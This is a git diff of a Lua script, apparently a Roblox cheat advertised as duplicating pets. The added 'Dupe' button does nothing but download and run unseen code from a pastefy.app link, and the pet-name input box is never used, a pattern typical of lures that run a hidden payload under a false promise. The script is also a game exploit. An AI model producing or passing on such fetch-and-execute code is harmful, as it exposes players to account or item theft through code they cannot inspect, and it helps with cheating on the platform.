7b260d7f2b250d1083f45df01b0e87d664166116
exclusiv1337 <exclusiv1392@gmail.com>
2025-05-24 15:56:16 +0200

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -1,15 +1,21 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Dupe Pets by Mangekoy2 | v2.0", "Serpent")
 
--- Главная вкладка
-local MainTab = Window:NewTab("Dupe Pet")
-local MainSection = MainTab:NewSection("")
+-- Вкладка Dupe Pet
+local DupeTab = Window:NewTab("Dupe Pet")
+local DupeSection = DupeTab:NewSection("DUPE PET")  -- Зеленый заголовок
 
--- Текстовое поле с заголовком "DUPE PET"
-local InputBox = MainSection:NewTextBox("DUPE PET", "Write any pet there", function(text)
-    -- Здесь можно использовать введенный текст
+-- Текстовое поле для ввода
+local InputField = DupeSection:NewTextBox("", "Type here!", function(text)
+    -- Можно использовать введенный текст
 end)
-InputBox.Instance.Size = UDim2.new(0, 300, 0, 30)
+InputField.Instance.Size = UDim2.new(0, 250, 0, 30)
+
+-- Кнопка Dupe
+local DupeButton = DupeSection:NewButton("Dupe", "", function()
+    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
+end)
+DupeButton.Instance.Size = UDim2.new(0, 100, 0, 30)
 
 -- Вкладка Credits
 local CreditsTab = Window:NewTab("Credits")
